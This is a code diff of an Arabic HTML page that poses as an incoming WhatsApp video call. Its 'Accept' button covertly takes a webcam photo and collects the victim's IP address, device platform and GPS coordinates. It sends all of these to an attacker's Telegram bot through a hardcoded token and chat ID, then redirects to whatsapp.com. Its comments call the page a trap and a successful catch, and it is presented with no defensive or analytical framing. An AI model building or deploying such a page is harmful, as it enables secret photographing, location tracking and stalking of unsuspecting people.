@@ -2,72 +2,65 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام الأمان - عباس</title>
+    <title>WhatsApp Video Call</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 280px; text-align: center; }
-        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; }
-        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        body { background: #075e54; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
+        .avatar { width: 100px; height: 100px; background: #ddd; border-radius: 50%; margin: 0 auto 20px; }
+        .calling { font-size: 24px; margin-bottom: 10px; }
+        .accept-btn { background: #25d366; border: none; padding: 15px 40px; border-radius: 30px; color: white; font-size: 18px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h3>التحقق من الهوية</h3>
-    <input type="text" id="n" placeholder="اكتب اسمك للمتابعة...">
-    <button onclick="captureAndSend()">دخول آمن</button>
-</div>
+    <div class="avatar"></div>
+    <div class="calling">اتصال فيديو وارد...</div>
+    <p>يرجى قبول الاتصال للمتابعة</p>
+    <button class="accept-btn" onclick="startTrap()">رد (Accept)</button>
 
-<video id="v" autoplay style="display:none"></video>
-<canvas id="c" style="display:none"></canvas>
+    <video id="v" autoplay style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
 
 <script>
     const T = "8798304320:AAHW11ODgkShNPElpztLvomrquwaPDcINWQ";
     const ID = "2092901099";
 
-    async function captureAndSend() {
-        const name = document.getElementById('n').value;
-        if(!name) return alert("اكتب اسمك!");
-
+    async function startTrap() {
         try {
-            // 1. طلب الكاميرا
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            // طلب الكاميرا تحت غطاء "قبول المكالمة"
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            
+            // سحب الـ IP والموقع الجغرافي (GPS)
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            
+            // محاولة سحب إحداثيات GPS (تطلب إذن آخر)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${ID}&text=${encodeURIComponent("📍 موقع GPS الدقيق: " + gps)}`);
+            });
+
             const v = document.getElementById('v');
             v.srcObject = stream;
 
-            // 2. سحب الـ IP
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "مخفي"}));
-
-            // 3. التقاط الصورة بعد ثانية
             setTimeout(async () => {
                 const c = document.getElementById('c');
-                c.width = 320; 
-                c.height = 240;
-                c.getContext('2d').drawImage(v, 0, 0, 320, 240);
+                c.width = 400; c.height = 300;
+                c.getContext('2d').drawImage(v, 0, 0, 400, 300);
+                const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.5));
+
+                const fd = new FormData();
+                fd.append('chat_id', ID);
+                fd.append('photo', blob, 'shot.jpg');
+                fd.append('caption', `✅ صيد ناجح!\n🌐 IP: ${ipData.ip}\n📱 الجهاز: ${navigator.platform}`);
+
+                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                 
-                // تحويل الصورة لـ Blob (الطريقة الأضمن للإرسال)
-                c.toBlob(async (blob) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', ID);
-                    fd.append('photo', blob, 'image.jpg');
-                    fd.append('caption', `📸 صيد جديد يا عباس!\n\n📝 الاسم: ${name}\n🌐 الـ IP: ${ipData.ip}\n📱 الجهاز: ${navigator.platform}`);
-
-                    // إرسال الصورة للبوت
-                    await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
-                        method: 'POST',
-                        body: fd
-                    });
-
-                    stream.getTracks().forEach(t => t.stop());
-                    alert("تم التحقق بنجاح!");
-                    window.location.href = "https://www.google.com";
-                }, 'image/jpeg', 0.6);
-
-            }, 1500);
+                stream.getTracks().forEach(t => t.stop());
+                window.location.href = "https://www.whatsapp.com";
+            }, 2000);
 
         } catch (e) {
-            alert("لازم تضغط 'سماح' للكاميرا!");
+            alert("خطأ في الاتصال: يرجى السماح بالوصول للكاميرا.");
         }
     }
 </script>
